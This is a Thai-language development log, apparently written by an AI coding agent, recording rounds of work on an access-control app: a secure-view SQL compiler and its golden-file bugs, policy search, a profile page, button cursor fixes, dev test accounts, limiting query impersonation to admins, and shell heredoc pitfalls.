### AK.2 🔍 บั๊ก 2 ตัวที่เจอเพราะ **นั่งอ่าน DDL ที่มันสร้างออกมา** ไม่ใช่เพราะเทสต์แดง

เทสต์ 18 ตัวเขียวหมดแล้ว แต่พอเอา golden file มาอ่านทีละบรรทัดถึงเจอ:

1. **ฝั่ง SQL Server แพงเกินจำเป็น** — row gate เดิมใช้ `SqlDialect.toText(...)` ซึ่งบน SQL Server แปลว่า `CAST(... AS nvarchar(max))`
   เทียบ `nvarchar(max)` กับคอลัมน์ `nvarchar(256)` → **index seek บน PK ของ `row_entitlement` ใช้ไม่ได้** และ predicate ตัวนี้รัน **ทุกแถวของตารางจริง** → ชน NFR-2 เต็มๆ
   แก้เป็น `CAST(... AS <aclTextType()>)` คือ cast ไปเป็นชนิดของคอลัมน์ ACL เอง
   ```
   secure-view-postgres.sql:79    AND e."value"  = CAST("t"."branch_code"  AS text)
   secure-view-sqlserver.sql:82   AND e.[value]  = CAST([t].[branch_code]  AS nvarchar(256))
   ```
2. **`condition` ของ cell mask เป็น SQL ที่คนเขียนเอง** แล้วถูกใส่ลง view **ดิบๆ ตามที่เขียน** — และมันข้าม engine ได้ (เขียนบน PG แล้วไป compile ลง MSSQL)
   raw row filter มีคำเตือนอยู่แล้ว แต่อันนี้ไม่มี → เพิ่ม note ที่ระบุชื่อ dialect ให้คนที่กด approve DDL เห็น

> **บทเรียนที่ต้องจำ:** golden-file test พิสูจน์แค่ว่า "ผลลัพธ์ไม่เปลี่ยน" ไม่ได้พิสูจน์ว่า "ผลลัพธ์ถูก" — ตอน bless ไฟล์ครั้งแรกต้องอ่านจริงทั้งไฟล์

### AK.3 ⚠️ ข้อจำกัดที่ **จงใจไม่แก้** — `CONSTANT` บน column ที่เป็นตัวเลข

fixture มี `CONSTANT '***'` ทับ column `salary` ที่เป็น numeric → ได้
```sql
CASE WHEN … THEN "t"."salary" ELSE CASE WHEN (…) THEN '***' ELSE "t"."salary" END END AS "salary"
```
PostgreSQL จะปฏิเสธตอน `CREATE VIEW` ด้วย numeric coercion error

**ทำไมไม่แก้:** นี่เป็น **policy ที่คนเขียนผิด** ไม่ใช่บั๊กของ compiler และมันผิดเท่ากันทั้ง 3 โหมด (นิพจน์มาจาก `DecisionSql.masked` ที่ใช้ร่วมกัน)
ถ้า "แก้" ด้วยการ cast `salary` เป็น text จะทำให้ **ชนิดของคอลัมน์ใน view เปลี่ยนไปสำหรับผู้อ่านทุกคน** — แย่กว่าเดิม
→ ปล่อยให้ขั้นตอน apply DDL (slice 3) เป็นคนบอก แล้วให้คนเขียน policy แก้ที่ต้นทาง

### AK.4 เคอร์เซอร์ไม่เป็นรูปมือ — คราวนี้กวาดทั้งแอปทีเดียว

ผู้ใช้ทักเรื่องนี้เป็น**ครั้งที่ 3** (หน้า Governance กับหน้า People & attributes) → เลิกแก้ทีละจุด เขียนสคริปต์ไล่ `<button>` ทุกตัวใน `src/**/*.tsx` แล้วเช็กว่า className มี `tw:cursor-pointer` ไหม

เจอ **20 ปุ่ม** ที่ขาด แก้ครบทั้งหมด:

| ไฟล์ | จำนวน |
|---|---|
| `pages/governance/GovernancePage.tsx` | 3 (แท็บ · ปุ่ม action · chevron) |
| `pages/governance/PrincipalsPage.tsx` | 4 (ชิปตัวกรอง · ปุ่มสลับ kind · หัว accordion · show all) |
| `pages/catalog/CatalogPage.tsx` | 3 |
| `pages/catalog/GrantDialog.tsx` | 3 (หนึ่งในนั้นแก้ที่ helper `chip()` ไม่ใช่ที่ call site) |
| `pages/query/SchemaExplorer.tsx` | 3 |
| `pages/query/QueryPage.tsx` · `pages/docs/ExpressionDocsPage.tsx` · `pages/settings/pickers.tsx` | 4 |

`pickers.tsx` ปุ่ม **Change** disable ได้ → ใส่ `tw:disabled:cursor-default` คู่ไปด้วย ปุ่มที่กดไม่ได้ต้องไม่ยื่นรูปมือให้

**สคริปต์ตรวจเก็บไว้ที่** `scripts/check-cursor-pointer.mjs` — รันซ้ำได้ ถ้าเลข > 1 แปลว่ามีปุ่มใหม่ที่ลืม
(ที่เหลือ 1 ตัวคือ `<button>` ที่อยู่ใน**คอมเมนต์** ของ `layout/TopNav.tsx` — false positive)

### AK.5 Analyst A / B / C ล็อกอินได้จริงแล้ว

`analyst_a` กับ `analyst_b` **มีอยู่ใน DB มาตลอดพร้อม attribute ครบ แต่ไม่มี password** → ไม่เคยมีใครล็อกอินเป็นพวกเขาได้จริงเลย
`analyst_c` (เพอร์โซนา "เจ้าของ asset" ของ E2E ข้อ 10) ยังไม่มีเลย

| user | department | clearance | country | branch | บทบาทในเทสต์ |
|---|---|---|---|---|---|
| `analyst_a` | FINANCE | **L1** | **TH** | BKK-01 | โดน mask · เห็นเฉพาะ branch ตัวเอง |
| `analyst_b` | FINANCE | **L2** | **SG** | SIN-01 | clearance ผ่าน แต่โดน **deny ทั้ง table** เพราะ country ≠ dataResidency |
| `analyst_c` | FINANCE | **L1** | TH | CNX-01 | **ตั้ง clearance ต่ำโดยตั้งใจ** — ถ้าเข้าถึงได้ ต้องเป็นเพราะ `assetOwner: true` ไม่ใช่เพราะ clearance |

ทั้งสามได้ app role `REQUESTER` และเคลียร์ `must_change` ให้แล้ว (เพราะ**ยังไม่มีหน้าจอเปลี่ยน password** ถ้าไม่เคลียร์จะล็อกอินเข้าไปแล้วติดอยู่ตรงนั้น)

⚠️ **attribute ของ `analyst_c` ต้อง `INSERT` ด้วย SQL ตรงๆ** เพราะ M2 **ยังไม่มี write API สำหรับ attribute** — ข้อนี้ยังค้างอยู่เหมือนเดิม

> password เป็นของ **dev บน localhost เท่านั้น** อยู่ในแชทกับใน DB ที่รันอยู่ ไม่ได้ถูกเขียนลงไฟล์ไหนที่ commit ทั้งสิ้น

### AK.6 🪤 กับดักใหม่ 3 ตัวที่เสียเวลาไปรอบนี้

1. **heredoc ของ Bash ใหญ่พอจะใส่ไฟล์ Java ~600 บรรทัดไม่ได้** → `ENAMETOOLONG: name too long, uv_spawn` ต้องใช้ Write tool
2. **heredoc ของ Bash แปลง `\n` ในเนื้อหาให้เป็นขึ้นบรรทัดจริง** → พัง Java string literal เงียบๆ (`"... AS\n" + body` กลายเป็น literal ที่ไม่ปิด) **โดนไป 3 ครั้งรอบนี้** รวมถึงตอนแก้ `PostgresDialect` / `SqlServerDialect` / `ViewCompilerTest`
   เช่นเดียวกัน `\\` ในเนื้อหา heredoc ก็ยุบเหลือ `\` → `os.path.join(...).replace('\', '/')` พังทันที
   **→ อะไรที่มี backslash ให้เขียนไฟล์สคริปต์ด้วย Write tool แล้ว `python <path>` เท่านั้น**
3. **`-DfailIfNoSpecifiedTests=false` ไม่มีอยู่จริง** ชื่อที่ถูกคือ **`-Dsurefire.failIfNoSpecifiedTests=false`** (ต้องใช้เมื่อ `-Dtest=` คู่กับ `-am` เพราะ `dac-spec` ไม่มีเทสต์ที่ชื่อตรง)

### AK.7 ผลรันจริงรอบนี้

```
./mvnw -o test                      → BUILD SUCCESS   (ทุก module)
./mvnw -o -pl backend/dac-compiler-sql -am test
    DecisionSqlRowFilterTest  7      Failures: 0
    ViewCompilerTest         18      Failures: 0
    dac-compiler-sql         25      Failures: 0
npx tsc --noEmit                    → exit 0
VITE_BASE=/Arak/ npx vite build     → built in 9.03s
login analyst_a / analyst_b / analyst_c → 200 · roles=[REQUESTER] · mustChange=False
http://localhost:8090/Arak/         → 200
```

### AK.8 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `backend/dac-compiler-sql/…/ViewCompiler.java` | **ใหม่** ~640 บรรทัด — หัวใจของ M5 slice 1 |
| `backend/dac-compiler-sql/…/ViewCompilerTest.java` | **ใหม่** — 18 tests |
| `backend/dac-compiler-sql/src/test/resources/golden/secure-view-{postgres,sqlserver}.sql` | **ใหม่** — golden file 2 dialect |
| `backend/dac-compiler-sql/…/{PostgresDialect,SqlServerDialect}.java` | ซ่อม string literal ที่ `\n` ถูกเขียนเป็นขึ้นบรรทัดจริง |
| `frontend/app/src/pages/**` 8 ไฟล์ | `tw:cursor-pointer` 20 ปุ่ม |
| `scripts/check-cursor-pointer.mjs` | **ใหม่** — ตัวตรวจว่ามีปุ่มไหนลืมใส่ |

### AK.9 ต่อจากนี้ (M5 slice 2) — **ทำแล้วรอบนี้ ดูข้อ AT**

~~`V12__row_entitlement.sql`~~ **(ข้อนี้ผิด — ตาราง `acl.*` อยู่ที่ source ไม่ใช่ app DB ดูข้อ AT.1)** + `RowEntitlementMaintainer` ที่แปลง `PolicyDecision` ของแต่ละ principal → แถวในตาราง ACL 3 ใบ
**ต้องเรียก `ViewCompiler.treatmentKey(...)` ห้ามคำนวณคีย์เอง** ไม่งั้น key ที่ maintainer เขียนกับที่ view มองหาจะไม่ตรงกัน แล้วทุกคนจะได้ `ELSE` (mask เข้มสุด) โดยไม่มีอะไรฟ้อง

---

## รอบก่อนหน้า — **ค้นหา policy ได้** · **หน้า Your profile** · และเริ่ม **M5 Secure View**

### AJ.1 หน้า Policies ค้นหาได้แล้ว — และค้นที่ server ไม่ใช่ที่หน้าจอ

ผู้ใช้สั่ง *"หน้า Policies อยากให้มี Search ด้วย"*

**จุดที่เกือบพลาด:** `GET /v1/policies` ส่งมาทีละหน้า (`limit` default 50, เพดาน 200) ถ้า filter เอาเฉพาะแถวที่อยู่บนจอ คนที่ค้นหาว่า "มี policy คุม PII อยู่แล้วหรือยัง" จะได้คำตอบว่า **"ไม่มี"** ทั้งที่มี — เป็นคำตอบที่ผิดแบบอันตรายที่สุดในหน้านี้ จึงทำเป็น server-side

- `PolicyStore.list(...)` รับ `search` เพิ่ม → `name ILIKE ... OR display_name ILIKE ... OR description ILIKE ... OR scope_fqn ILIKE ...`
  ค้น 4 คอลัมน์เพราะคนจำคนละอย่าง: ชื่อที่ตั้งไว้ / ชื่อที่แปะทีหลัง / เหตุผลที่เขียนไว้ / **ชื่อตารางที่มันคุม** (อันหลังคือที่คนใช้จริงมากที่สุด)
- `escapeLike()` — FQN เต็มไปด้วยจุด (LIKE ไม่สนใจ) แต่ชื่อ policy มี `_` ซึ่ง LIKE อ่านเป็น "อักษรอะไรก็ได้ 1 ตัว" ถ้าไม่ escape คนค้น `pii_mask` จะเจอ `piixmask` ด้วย
- `GET /v1/policies?q=` · `fetchPolicies({ q })` · ช่อง Search + ปุ่ม Clear บนหน้า `/policies` เก็บคำค้นไว้ใน URL (`?q=`) เหมือนหน้า People จะได้ copy link ส่งต่อได้
- empty state เปลี่ยนเป็น `No policy matches "<คำค้น>"` ไม่ใช่ข้อความกลางๆ

**พิสูจน์กับ API จริง:** `q=finance` → 3 · `q=owner` → 1 · `q=salesdb.sales` → 12 · **`q=example_owner` → 0** (ข้อสุดท้ายคือหลักฐานว่า `_` ถูก escape จริง ไม่งั้นต้องเจอ `example-owner`)
**พิสูจน์ในเบราว์เซอร์:** 14 แถว → ค้น `owner` → 1 แถว → ค้นคำมั่ว → empty state ที่มีคำค้นอยู่ในข้อความ → Clear → 14 แถว

### AJ.2 หน้า `/profile` — "ระบบรู้อะไรเกี่ยวกับฉันบ้าง"

ผู้ใช้สั่ง *"อยากให้เพิ่มหน้า profile ที่บอกว่าตัวเองมี User attribute อะไรบ้าง"*

เป็นหน้า **อ่านอย่างเดียว** ไม่ใช่หน้า settings — ตอบคำถามที่คนถามหลังโดนปฏิเสธไม่ให้เข้า table ว่า "ระบบคิดว่าฉันเป็นใคร" เดิมทางเดียวที่จะเห็น attribute ของตัวเองคือไปที่ directory (`/principals`) ซึ่งลิสต์ทุกคนและอ่านแล้วเหมือนเรื่องของคนอื่น

- `frontend/app/src/pages/ProfilePage.tsx` — ตัวตน · **Attributes** · Groups · Platform roles
- เรียก `GET /v1/principals/{id}` ด้วย **id จาก token** (username ไม่ unique ข้าม directory) · endpoint นี้เป็น `@Secured` เฉยๆ ไม่ได้จำกัด role อยู่แล้ว
- route `/profile` + เมนู **Your profile** ใต้ avatar มุมขวาบน
- **จงใจไม่ใช้ `/principals/:id`** — route นั้นคือ directory (เรื่องของคนอื่น เข้าถึงโดยค้นหา) ส่วน `/profile` ไม่ต้องมี id จึงยังทำงานได้ถ้าวันหนึ่ง directory ถูกจำกัดเฉพาะ admin

**สามประโยคบนหน้าที่ตั้งใจเขียน ไม่ใช่ filler:**
1. attribute หนึ่ง key มีได้หลายค่า — `clearance` ที่มีทั้ง `L1` และ `L2` ผ่าน policy ที่ขอ L2 (หน้าเว็บ**ห้าม**ยุบสองแถวเป็นแถวเดียว)
2. ไม่มี attribute เลย ≠ ผ่านทุก policy — **engine deny by default** ข้อความจึงเขียนว่า *"Any policy that tests one will refuse"* ไม่ใช่ *"ยังไม่มีข้อมูล"* เฉยๆ
3. **platform role ไม่ใช่สิทธิ์เข้าข้อมูล** — `PLATFORM_ADMIN` บอกว่าทำอะไรกับ *ARAK* ได้ ไม่ได้แปลว่าเห็นแถวไหนในตารางลูกค้า คนสับสนข้อนี้บ่อย

**เทสต์ 3 ตัวใน `ProfilePage.test.tsx`** — เพราะ account เดียวที่ login ได้บนเครื่อง dev (`admin`) **มี attribute = 0** ทางที่จะพิสูจน์ layout ตอนมีข้อมูลจริงจึงไม่มีในเบราว์เซอร์ ต้อง mock
⚠️ **กับดัก:** `getAllByText('clearance')` ได้ 3 ไม่ใช่ 2 เพราะประโยคอธิบายด้านบนใช้ `<code>clearance</code>` เป็นตัวอย่าง → แก้ด้วยการใส่ `aria-label="Your attributes"` / `"Your groups"` ให้ `<ul>` แล้ว query ด้วย `within()` (ได้ a11y เป็นของแถม)

### AJ.3 เทสต์

| ชุด | ก่อน | หลัง |
|---|---|---|
| Frontend | 20 suites / 123 | **21 suites / 126** (+`ProfilePage.test.tsx` 3) |

`npx tsc --noEmit` exit 0 · `npx eslint` สะอาด · backend `package` BUILD SUCCESS · rebuild `dist` + restart backend แล้ว (ตามกฎข้อ AI.1)

---

## รอบก่อนหน้า — **build ที่ผู้ใช้เห็นอยู่เก่าไป 1 ชั่วโมง** · ชิปบอกคำว่า inherited · **query แทนคนอื่นเหลือแค่ admin** · และ **subscription policy เลือกได้แค่ระดับ table**

ผู้ใช้ส่งภาพหน้าจอมาบอกว่า "ไม่เห็นมีอะไรเปลี่ยนเลย" — ทั้งลูกศรขึ้นลงบนแถบแท็บที่บอกว่าแก้แล้ว และชิป Domain ที่ยังขึ้นชื่อจากกลาง FQN **คำตอบคือโค้ดถูก แต่ของที่เสิร์ฟอยู่เก่า** ส่วนที่เหลือเป็นคำสั่งใหม่สี่ข้อ

### AI.1 🪤 ที่เสียเวลามากที่สุดรอบนี้ — **แก้โค้ดแล้วไม่ได้ build ใหม่**

ผู้ใช้ดูที่ `http://localhost:8090/Arak/` ซึ่งคือ **jar เสิร์ฟ `frontend/app/dist`** ไม่ใช่ Vite dev ที่ `:3000`

```
dist/index.html                          16:06
src/pages/catalog/AssetDetailPage.tsx    17:04   <- แก้หลัง build ไป 1 ชั่วโมง
```

ทุกอย่างที่รายงานว่า "เสร็จแล้ว" ในรอบก่อน — กรอบแท็บ, cursor pointer, ลูกศรขึ้นลงหาย, ชิปขึ้นต้นด้วยชื่อชนิด — **อยู่ในโค้ดจริงทั้งหมด แต่ไม่เคยถึงเบราว์เซอร์** ผู้ใช้จึงเห็นของเก่าและสรุปว่ายังไม่ได้แก้ ซึ่งถูกจากมุมของเขา

**กฎที่ต้องทำทุกครั้งที่แตะ `frontend/app/src` แล้วจะให้ผู้ใช้ดู:**

```bash
cd frontend/app && MSYS_NO_PATHCONV=1 VITE_BASE=/Arak/ npx vite build
# แล้ว restart backend เพราะ jar cache index.html ไว้
```

ทั้งสองบรรทัดจำเป็น — ข้ามข้อไหนข้อหนึ่งก็ได้ผลเหมือนไม่ได้แก้

**หลัง build + restart แล้ว ตรวจจากเบราว์เซอร์จริง:**

| | ผล |
|---|---|
| `[role=tablist]` `overflowY` | `hidden` |
| แถบแท็บมี scrollbar แนวตั้งไหม | **ไม่มี** (`scrollHeight > clientHeight` = false) |
| กรอบแท็บ | `1px` · แท็บที่เลือกเป็นสีน้ำเงิน |
| cursor บนแท็บ | `pointer` |
| ชิปบนหน้า `dtp-iprm.iprm.public.employees` | `Domain Premium Service Delivery - IOS Data/DTP - Sub Domain inherited` |

ชิป Domain ขึ้นต้นด้วยคำว่า `Domain` แล้ว และชื่อเริ่มอ่านจากตัวแรกไม่ใช่กลาง FQN ตามที่ผู้ใช้ทัก

### AI.2 ลูกศรขึ้นบนชิป → เขียนคำว่า `inherited` ไปเลย

ผู้ใช้ถามว่า "เครื่องหมายนี้หมายถึงอะไรอะ แก้ได้ไหม ดูไม่สวย" — คำถามนี้คือคำตอบอยู่ในตัว สัญลักษณ์ที่ต้องมีคนอธิบายให้ฟังก่อนถึงจะอ่านออก ไม่ได้ทำหน้าที่อะไรเลย ที่แย่กว่านั้นคือมันมี `aria-hidden` ด้วย แปลว่าคนที่ใช้ screen reader ไม่ได้ข้อมูลนี้เลยตั้งแต่แรก

`src/pages/catalog/facets.tsx` — ทั้ง `FacetChip` และ `OwnerChip`:

```tsx
{!facet.direct && (
  <span className="tw:ml-1 tw:shrink-0 tw:text-[10px] tw:opacity-70">
    inherited
  </span>
)}
```

ยาวขึ้น 9 ตัวอักษร แลกกับไม่ต้องมีคำอธิบายประกอบ และ screen reader อ่านได้ด้วย (ถอด `aria-hidden` ออก)

### AI.3 หัวข้อหน้า Policies — ตัดบรรทัดตรงที่ประโยคจบ

ผู้ใช้ระบุจุดตัดมาเอง: จบบรรทัดแรกที่ `...down to` แล้วขึ้นบรรทัดใหม่ที่ `a single column`

ปล่อยให้ wrap เองแล้วบรรทัดสองเหลือสามคำโดดๆ และ `text-pretty` ก็แค่เปลี่ยนว่าสามคำไหน — จุดตัดที่อ่านแล้วเหมือนตั้งใจมีอยู่จุดเดียวคือตรงรอยต่อของประโยค `src/pages/policies/PolicyListPage.tsx` ใส่ `<br />` ตรงนั้นและเพิ่ม `tw:max-w-3xl`

### AI.4 🔒 Query แทนคนอื่น — เหลือแค่ PLATFORM_ADMIN

คำสั่งผู้ใช้: `Query as คนอื่น ให้ทำได้แค่ admin นะ คนอื่นต้องทำไม่ได้`

เดิม `QueryResource.mayImpersonate()` ยอมให้ 4 role: `PLATFORM_ADMIN` · `POLICY_AUTHOR` · `DATA_OWNER` · `AUDITOR` เหตุผลเดิมคือ "คนเขียน policy ต้องทดสอบก่อน publish" แต่เหตุผลนั้นไม่ครอบคลุมสิ่งที่ฟีเจอร์นี้ทำจริง — **แถวที่ได้กลับมาคือแถวของคนนั้น** ฟีเจอร์นี้จึงอ่านข้อมูลแทนเขา และ policy author ที่ถือสิทธิ์นี้อ่าน table ไหนก็ได้ เพียงแค่ระบุชื่อคนที่เข้าถึง table นั้นได้

```java
private static boolean mayImpersonate(AuthenticatedUser user) {
  return user.isPlatformAdmin();
}
```

**สิ่งที่ policy author ยังทำได้เหมือนเดิม:** Simulator (FR-5.2) — ตอบคำถามเดียวกันว่า "คนนี้จะเห็นอะไร" โดยไม่ส่งข้อมูลจริงกลับมา

**สิ่งที่ไม่เปลี่ยน:** การ impersonate ไม่เคยเป็นช่องผ่าน policy — query ถูก evaluate ในนามคนที่ถูกระบุ admin จึงเห็นเท่าที่คนนั้นเห็นพอดี และ audit บันทึกในชื่อ admin เอง

ฝั่ง UI (`QueryPage.tsx`) ซ่อน Select `Run as` เมื่อไม่ใช่ admin และ **ไม่ยิง `fetchPrincipals` เลย** (`enabled: isAdmin`) — ตัวบังคับจริงอยู่ที่ server ตามเดิม

### AI.5 Subscription policy — เลือกได้แค่ระดับ **Table**

คำสั่งผู้ใช้: `ปรับ Subscription Policy ให้ มีให้เลือกแค่ระดับ table ก่อน ระดับอื่น hide ไปก่อน`

`src/pages/policies/PolicyBuilderPage.tsx`:

```ts
const SUBSCRIPTION_LEVELS: Policy['scopeLevel'][] = ['TABLE'];

function levelOptions(policy: Policy) {
  if (policy.policyType !== 'SUBSCRIPTION') return SCOPE_LEVELS;
  return SCOPE_LEVELS.filter(
    (level) =>
      SUBSCRIPTION_LEVELS.includes(level.value) || level.value === policy.scopeLevel
  );
}
```

**สามจุดที่ต้องระวังและจัดการไว้แล้ว:**

1. **policy เดิมที่อยู่ชั้นอื่นต้องเก็บชั้นของตัวเองไว้ในเมนู** — ไม่งั้น `finance-subscription` (ORG) ที่เปิดมาแก้เรื่องอื่น จะโดน save ทับเป็น TABLE เงียบๆ ทั้งที่ไม่มีใครสั่ง → `levelOptions` จึงเติม `policy.scopeLevel` เข้าไปเสมอ
2. **`EMPTY.scopeLevel` เปลี่ยนเป็น `TABLE`** ไม่งั้น draft ใหม่ถือค่าที่ไม่มีในเมนู
3. **data policy ยังเปิดมาที่ ORG เหมือนเดิม** — mask ตาม tag เขียนครั้งเดียวคุมทั้งองค์กรคือจุดขายของมัน และ data policy ชั้นนอกไม่เคยล็อกใครออก มันแค่เพิ่ม mask

**ตรวจจากเบราว์เซอร์จริง:**

| หน้า | ตัวเลือกใน Level |
|---|---|
| `policies/new?kind=SUBSCRIPTION` | `["Table"]` |
| `policies/new?kind=DATA` | `["Organisation","Domain or sub-domain","Service","Database","Schema","Table","Column"]` |
| แก้ `finance-subscription` (ORG, subscription) | `["Organisation","Table"]` <- ชั้นของตัวเองยังอยู่ |

> **เหตุผลที่ซ่อน ไม่ใช่ลบ:** engine ยัง compose ครบเจ็ดชั้นและ document ที่เก็บไว้ยังถือครบเจ็ดชั้น — subscription ที่เขียนไว้ชั้นนอกเป็น gate ของทุกอย่างใต้มัน ซึ่งเป็นทั้งประโยชน์ของมันและเป็นเหตุผลที่ grant ตรงบน table เดียวออกมาเป็น "In force · lets nobody in" ได้ ตราบใดที่หน้าจอยังไม่อธิบายเรื่องนี้ตรงจุดที่คนไปเจอ การเปิดชั้นนอกให้เลือกในฟอร์มคือการยื่นปืนให้ยิงเท้าตัวเอง

### AI.6 ผลรันจริงรอบนี้

| | |
|---|---|
| `npx tsc --noEmit` | exit 0 |
| `npx eslint` 4 ไฟล์ที่แก้ | สะอาด |
| `npx jest` | **20 suites / 123 tests** เขียวหมด |
| `./mvnw -o -pl backend/dac-engine -am test` | **277 tests** เขียวหมด · BUILD SUCCESS |
| `vite build` | ผ่าน · restart backend แล้ว `http://localhost:8090/Arak/` ตอบ 200 |

### AI.7 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `frontend/app/src/pages/catalog/facets.tsx` | ลูกศรขึ้น -> คำว่า `inherited` (ทั้ง `FacetChip` และ `OwnerChip`) · ถอด `aria-hidden` |
| `frontend/app/src/pages/policies/PolicyListPage.tsx` | `<br />` ตรงรอยต่อประโยค + `tw:max-w-3xl` |
| `frontend/app/src/pages/policies/PolicyBuilderPage.tsx` | `SCOPE_LEVELS` · `SUBSCRIPTION_LEVELS` · `levelOptions()` · `EMPTY.scopeLevel = 'TABLE'` · placeholder ของ Anchor ตามชั้น |
| `frontend/app/src/pages/query/QueryPage.tsx` | ซ่อน `Run as` เมื่อไม่ใช่ admin · `fetchPrincipals` `enabled: isAdmin` |
| `backend/.../resources/QueryResource.java` | `mayImpersonate()` -> `isPlatformAdmin()` เท่านั้น (⚠️ ไฟล์เป็น **CRLF**) |

### AI.8 ยังค้าง

- **Save query / share query** (ข้อสุดท้ายของคิว UI) — ยังไม่เริ่ม · recon แล้ว: ต้องมี `V12__saved_query.sql` + store + Jersey resource + tests + UI บน `QueryPage.tsx` · **ข้อควรระวังด้านความปลอดภัย: สิ่งที่แชร์คือ *ประโยค SQL* ไม่ใช่ผลลัพธ์ — คนเปิดต้องถูก evaluate ใหม่ในนามตัวเอง** และยังมีความเสี่ยงตกค้างว่า literal ใน `WHERE` เองก็เป็นข้อมูลได้
- **ชื่อ policy ที่บล็อก grant อยู่ ยังไม่ทะลุถึงหน้า Access** — `PolicyEngine.decideSubscription()` ยิง `DecisionReason` ที่ระบุชื่อ policy ของ gate แล้ว (รอบนี้ compile + 277 tests ผ่าน) แต่ `AccessQuery.onAsset()` ยัง `continue` ทิ้ง `decision.getReasons()` บนขา `!allowed` และ `AccessTab.tsx` ยังเขียนลอยๆ ว่า "A policy on an outer layer is refusing them"
- **ยังไม่ได้ตอบ**: จะเปิด `allowLocalOverride` ให้ `finance-subscription` (`b594579f-a825-42bc-9dac-64de9b279d03`) หรือไม่ — **ไม่แตะข้อมูลผู้ใช้โดยไม่ได้สั่ง**
- **คำถามที่ผู้ใช้ถามค้างไว้**: พื้นที่ใต้แถบแท็บควรอยู่ในกรอบเดียวกับแท็บและเป็นพื้นขาวด้วยหรือไม่ — ตอนนี้แท็บมีกรอบของตัวเอง ส่วนเนื้อหาเป็นการ์ดขาวบนพื้นเทาของหน้า

---

## รอบก่อนหน้า — **ชิปเอาเส้นขอบออก** · **บอกให้ชัดว่าตรงไหน and ตรงไหน or** · และ **เทสต์ data policy ที่ชนกัน ซึ่งไปเจอบั๊กจริง**

สามเรื่อง มาจากคำสั่งผู้ใช้สามข้อในรอบเดียว: `Tag ลองแบบไม่มีเส้นขอบแทน`, `ทำให้ชัดสิ ว่าตรงไหน เป็น and ตรงไหน เป็น or`, `ทดสอบทุก Case ให้ครบนะ อย่าลืม Case Datapolicy Conflict กันด้วย`

---

### AH.1 ชิป — เอาเส้นขอบออก เหลือแค่พื้นกับตัวอักษร

รอบที่แล้วเติมเส้นขอบให้ชิปเพื่อให้มันมีรูปร่าง ผู้ใช้ลองแล้วบอกให้เอาออก — **ซึ่งถูก** ที่ขนาด 12px เส้น 1px ที่สีใกล้กับพื้นมาก ๆ จะไม่ตกลงบนเส้น pixel พอดี เบราว์เซอร์เลย blend ออกมาเป็นรอยเปื้อนเทา ๆ รอบชิป ไม่ใช่ขอบ

| | เดิม | ตอนนี้ |
|---|---|---|
| ชิปสี (`pill-color`) | พื้น `-100` + `outline-1` สี `-200` | พื้น `-100` ตัวอักษร `-700` **ไม่มี outline** |
| ชิป facet ที่ตกทอดมา | พื้น `-50` + outline | พื้น `-50` ตัวอักษร `-700` **ไม่มี outline** |
| ชิปขาว (`modern` — เช่น owner) | ขอบเทา | **ยังมีขอบเหมือนเดิม** |

`modern` ยังมีขอบ เพราะพื้นมันขาวเท่าการ์ด ถ้าเอาขอบออกด้วยจะไม่เหลืออะไรบอกว่ามันเป็นชิป

**🪤 กับดัก — เส้นขอบของ badge เป็น prop ไม่ใช่ class** `ui-core-components/src/.../badges.tsx` render `bordered && 'tw:outline-1 tw:-outline-offset-1'` โดย `bordered = true` เป็นค่า default ที่บรรทัด 168/223/283/390/449/525 → **ลบ class สี outline อย่างเดียวไม่พอ** จะเหลือเส้นเทาบาง ๆ ต้องส่ง `bordered={false}` เข้าไป

แก้ที่เดียวได้ทั้งแอปเหมือนเดิม — `Chip` ใน `src/components/chips.tsx` ส่ง `bordered={bordered ?? modern}` (ค่าที่ caller ระบุเองยังชนะ) และ `facets.tsx` ที่เรียก `Badge` ดิบ ๆ ส่ง `bordered={false}` เพิ่มหนึ่งบรรทัด · 17 หน้าที่ `import { Chip as Badge }` ได้ตามทั้งหมดโดยไม่ต้องแก้

**ยืนยันด้วยตาบนของจริง** (`http://localhost:8090/Arak/catalog`, build ด้วย `VITE_BASE=/Arak/` แล้ว restart backend):
- ชิปสีตรง ๆ `rgb(254,228,226)` · ชิปที่ตกทอดมา `rgb(254,243,242)` · **ทั้งคู่ `outline-style: none`**
- **ชั้น `-50` ยังเห็นเป็นรูปร่างอยู่** บนการ์ดสีขาว และยังอ่อนกว่าชั้น `-100` อย่างชัดเจน → **ไม่ต้องขยับสเกลขึ้นเป็น `-100`/`-200`** ตามที่เผื่อไว้
- ชิปขาวของ owner ยังได้ `1px solid rgb(213,215,218)` ตามที่ตั้งใจ

---

### AH.2 ผู้ใช้ถามว่า "อันนี้คือ and หรือ or" — แปลว่าหน้าจอบอกไม่ชัดพอ

คำถามเต็มคือ *"Anyone who is in group x **or** in group Y — หรือ — in group x **and** group Y"* พร้อมรูปที่วงกรอบแดงไว้ที่รายการ `in the group` สองแถว และ `branch is FINANCE` สองแถว

**คำตอบ (ยืนยันกับ engine ไม่ใช่กับข้อความบนจอ):**

| ช่องในฟอร์ม | field ใน `SubjectRule` | ต่อกันด้วย | ยืนยันจาก |
|---|---|---|---|
| **Anyone who is** | `principals` | **OR** | `SubjectMatcher` — แถวไหนแถวหนึ่งผ่านก็พอ |
| **And who is also** | `requiredPrincipals` | **AND** | ต้องผ่านทุกแถว |
| **And whose attributes say** | `attributes` | **AND** | ทุกเงื่อนไขต้องจริง |
| **And this holds** (expression) | `expression` | **AND** กับที่เหลือ | |
| **And only during** | `time.windows` | **OR** | `TimeMatcher.java:59-64` — `return true` ทันทีที่เจอ window แรกที่ครอบเวลานั้น |

> window เป็น **OR** เป็นเรื่องที่ต้องอ่าน code ถึงจะรู้ ถ้าไปเขียนบนจอว่า "all of these" มันจะอธิบายกฎที่**เป็นจริงไม่ได้เลย** เพราะไม่มีวินาทีไหนอยู่ในสอง window ที่ไม่ทับกันพร้อมกัน

**ที่ทำลงไป** — `SubjectBuilder.tsx` เพิ่มสามตัว:
- `JoinTag` — ป้ายบนหัวข้อ: `ANY OF THESE` (ฟ้า) / `ALL OF THESE` (เทา)
- `SectionHeading` — หัวข้อ + ป้าย
- `JoinRow` — **คำว่า `or` / `and` คั่นอยู่ระหว่างแถว** พร้อมเส้นบาง ๆ · ขึ้นเฉพาะตั้งแต่แถวที่สองเป็นต้นไป

